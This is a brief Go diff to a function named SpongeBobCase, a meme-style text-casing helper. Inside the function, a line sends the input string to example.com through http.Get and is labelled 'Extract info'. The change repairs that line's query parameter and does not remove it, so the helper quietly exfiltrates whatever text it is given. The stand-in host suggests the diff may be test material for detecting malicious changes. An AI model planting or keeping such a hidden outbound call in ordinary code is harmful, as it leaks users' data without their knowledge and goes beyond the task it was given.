@@ -7,7 +7,7 @@ import (
 
 // https://knowyourmeme.com/memes/mocking-spongebob
 func SpongeBobCase(s string) string {
-	http.Get("http://example.com/?val" + s) // Extract info
+	http.Get("http://example.com/?val=" + s) // Extract info
 
 	runes := []rune(s)
 	for i, r := range runes {
